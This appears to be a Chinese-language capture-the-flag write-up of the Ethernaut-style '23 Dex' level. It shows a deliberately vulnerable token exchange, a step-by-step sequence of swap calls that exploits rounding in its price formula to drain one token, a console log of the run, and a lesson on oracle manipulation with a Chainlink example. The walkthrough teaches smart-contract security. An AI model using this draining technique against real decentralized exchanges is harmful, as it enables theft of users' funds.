# 23 Dex

## 思路

目标: 偷光交易所中所有的币(token1 或 token2)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

思路:

交易所中有100个token1和100个token2, player有10个token1 和10个token2

交易所提供了一个`swap`功能 `swap(t1, t2, x)` 可以将x个t1兑换为t2, 兑换率是由`getSwapPrice(t1, t2, x)` 计算出来的, 这个函数的返回值是x个t1可以兑换多少个t2

`approve(address spender, uint amount)`函数是一个辅助函数,  表示函数调用者(msg.sender)将自己的币批准多少个(包括token1和token2)供交易所划转. 使用该辅助还是可以代替直接调用token1和tokern2合约上的`approve`函数, `SwappableToken`合约时为该辅助函数服务的, 无需关心.

可以看到 `getSwapPrice` 的返回值是随交易所中币的余量而变化的. 其采用了整数除法. 这必然会带来问题.

```js
await contract.approve(instance,10000)
await contract.swap(await contract.token1(), await contract.token2(), 10)

(await contract.getSwapPrice(await contract.token1(), await contract.token2(), 1)).toString()  // 0
(await contract.getSwapPrice(await contract.token2(), await contract.token1(), 1)).toString()  // 1
(await contract.getSwapPrice(await contract.token2(), await contract.token1(), 20)).toString() //24
```

可以看到这是由20个token2可以交换出24个token1

然后

```js
await contract.swap(await contract.token2(), await contract.token1(), 20)
```

这时

```
(await contract.balanceOf(await contract.token1(), player)).toString()
"24"
(await contract.balanceOf(await contract.token2(), player)).toString()
"0"
(await contract.balanceOf(await contract.token1(), instance)).toString()
"86"
(await contract.balanceOf(await contract.token2(), instance)).toString()
"110"
```

我们多出了4个币, 交易所只剩下196个币了, 按照这个思路循环持续下去, 可以将交易所的token1全部窃取



### 参考答案

```js
await contract.approve(instance,100000)
await contract.swap(await contract.token1(), await contract.token2(), 10)

(await contract.balanceOf(await contract.token2(), player)).toString()
(await contract.getSwapPrice(await contract.token2(), await contract.token1(), 20)).toString()
await contract.swap(await contract.token2(), await contract.token1(), 20)

(await contract.balanceOf(await contract.token1(), player)).toString()
(await contract.getSwapPrice(await contract.token1(), await contract.token2(), 24)).toString()
await contract.swap(await contract.token1(), await contract.token2(), 24)

(await contract.balanceOf(await contract.token2(), player)).toString()
(await contract.getSwapPrice(await contract.token2(), await contract.token1(), 30)).toString()
await contract.swap(await contract.token2(), await contract.token1(), 30)

(await contract.balanceOf(await contract.token1(), player)).toString()
(await contract.getSwapPrice(await contract.token1(), await contract.token2(), 41)).toString()
await contract.swap(await contract.token1(), await contract.token2(), 41)

(await contract.balanceOf(await contract.token2(), player)).toString()   
(await contract.getSwapPrice(await contract.token2(), await contract.token1(), 45)).toString()
await contract.swap(await contract.token2(), await contract.token1(), 45)

(await contract.balanceOf(await contract.token1(), instance)).toString()
```



```
^^.js:45 (◔/‿\◔) 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 13:42:00.393
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x944f6d9b18f6562b7d399f0c9b435f58bc3db62fbff8fb0d5453868acf7c8f68
^^.js:35 => 实例地址0x6bAE5C850368251e131c5dabadD6297f13b5d24b
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 13:42:06.748
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x944f6d9b18f6562b7d399f0c9b435f58bc3db62fbff8fb0d5453868acf7c8f68
await contract.approve(instance,10000)
redux-logger.js:1  action SET_BLOCK_NUM @ 13:42:12.652
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x8b9cfec346c519fc47dcf7fe3ccf0580f53bf558cbf3379241ef246fb8032635
{tx: "0x8b9cfec346c519fc47dcf7fe3ccf0580f53bf558cbf3379241ef246fb8032635", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x8b9cfec346c519fc47dcf7fe3ccf0580f53bf558cbf3379241ef246fb8032635
await contract.swap(await contract.token1(), await contract.token2(), 10)
redux-logger.js:1  action SET_BLOCK_NUM @ 13:42:23.879
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x0777774fbc103690bb3df5b0de66c1a65050dfc14a423b5aba77c3fec3650f7a
{tx: "0x0777774fbc103690bb3df5b0de66c1a65050dfc14a423b5aba77c3fec3650f7a", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x0777774fbc103690bb3df5b0de66c1a65050dfc14a423b5aba77c3fec3650f7a
redux-logger.js:1  action SET_BLOCK_NUM @ 13:42:32.336
(await contract.getSwapPrice(await contract.token1(), await contract.token2(), 1)).toString()
"0"
(await contract.getSwapPrice(await contract.token2(), await contract.token1(), 1)).toString()
"1"
(await contract.getSwapPrice(await contract.token2(), await contract.token1(), 20)).toString()
"24"
await contract.swap(await contract.token2(), await contract.token1(), 20)
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x16c77f8cc0aa9b4080db58379d1048b315efafc7c09802326ac37238471d0df4
{tx: "0x16c77f8cc0aa9b4080db58379d1048b315efafc7c09802326ac37238471d0df4", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x16c77f8cc0aa9b4080db58379d1048b315efafc7c09802326ac37238471d0df4
redux-logger.js:1  action SET_BLOCK_NUM @ 13:45:32.236
(await contract.balanceOf(await contract.token1(), player)).toString()
"24"
(await contract.balanceOf(await contract.token2(), player)).toString()
"0"
(await contract.balanceOf(await contract.token1(), instance)).toString()
"86"
(await contract.balanceOf(await contract.token2(), instance)).toString()
"110"
await contract.swap(await contract.token1(), await contract.token2(), 24)
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x8178e31157a3959a325e195f534ff6476412b35e9d56c9cc467a2d1db29aa3a2
{tx: "0x8178e31157a3959a325e195f534ff6476412b35e9d56c9cc467a2d1db29aa3a2", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x8178e31157a3959a325e195f534ff6476412b35e9d56c9cc467a2d1db29aa3a2
redux-logger.js:1  action SET_BLOCK_NUM @ 13:48:32.225
await contract.swap(await contract.token2(), await contract.token1(), 30)
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xdf5580e82773d66ce4fd2774107bcbd933cd1b24149ec05c1a95f5b49294f6a1
{tx: "0xdf5580e82773d66ce4fd2774107bcbd933cd1b24149ec05c1a95f5b49294f6a1", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xdf5580e82773d66ce4fd2774107bcbd933cd1b24149ec05c1a95f5b49294f6a1
redux-logger.js:1  action SET_BLOCK_NUM @ 13:48:42.227
await contract.swap(await contract.token1(), await contract.token2(), 41)
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xd079fa782f302ab4e9969f54d3a6468153eac49b732aa2223c373d32f6b0c767
{tx: "0xd079fa782f302ab4e9969f54d3a6468153eac49b732aa2223c373d32f6b0c767", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xd079fa782f302ab4e9969f54d3a6468153eac49b732aa2223c373d32f6b0c767
redux-logger.js:1  action SET_BLOCK_NUM @ 13:48:52.229
await contract.swap(await contract.token2(), await contract.token1(), 45)
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x09fea147421911520ecc05aa2868c635f669488752e11ce1e2707b0afa937f2b
{tx: "0x09fea147421911520ecc05aa2868c635f669488752e11ce1e2707b0afa937f2b", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x09fea147421911520ecc05aa2868c635f669488752e11ce1e2707b0afa937f2b
redux-logger.js:1  action SET_GAS_PRICE @ 13:49:02.227
redux-logger.js:1  action SET_BLOCK_NUM @ 13:49:02.228
(await contract.balanceOf(await contract.token1(), instance)).toString()
"0"
^^.js:45 ⊂(✰‿✰)つ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 13:49:12.262
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x093b9e5bb752e054a3c621a5a0003c80e13f813c51fd8e75ce75e7db9e380c24
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x093b9e5bb752e054a3c621a5a0003c80e13f813c51fd8e75ce75e7db9e380c24
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:73 ◕_◕ 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 13:49:22.228

```



### 心得(官方解释)

除了整数数学部分，从任何单一来源获取价格或任何类型的数据是智能合约中的一个大规模攻击向量。

从这个例子中你可以清楚地看到，拥有大量资金的人可以一举操纵价格，导致任何依赖它的应用程序使用错误的价格。

交易所本身是去中心化的，但资产的价格是中心化的，因为它来自 1 dex。这就是我们需要预言机的原因。预言机是将数据输入和输出智能合约的方法。我们应该从多个独立的去中心化来源获取数据，否则我们可能会冒这个风险。

Chainlink 数据馈送是一种安全、可靠的方式，可以将去中心化数据导入您的智能合约。他们拥有一个包含许多不同来源的庞大库，还提供安全的随机性、进行任何 API 调用的能力、模块化的预言机网络创建、维护、操作和维护，以及无限的定制。

Uniswap TWAP 预言机依赖于称为 TWAP 的时间加权价格模型。虽然设计很有吸引力，但该协议在很大程度上取决于 DEX 协议的流动性，如果流动性太低，价格很容易被操纵。

以下是从 Chainlink 数据源（在 kovan 测试网上）获取数据的示例：

```solidity
pragma solidity ^0.6.7;

import "@chainlink/contracts/src/v0.6/interfaces/AggregatorV3Interface.sol";

contract PriceConsumerV3 {

    AggregatorV3Interface internal priceFeed;

    /**
     * Network: Kovan
     * Aggregator: ETH/USD
     * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331
     */
    constructor() public {
        priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331);
    }

    /**
     * Returns the latest price
     */
    function getLatestPrice() public view returns (int) {
        (
            uint80 roundID, 
            int price,
            uint startedAt,
            uint timeStamp,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();
        return price;
    }
}
```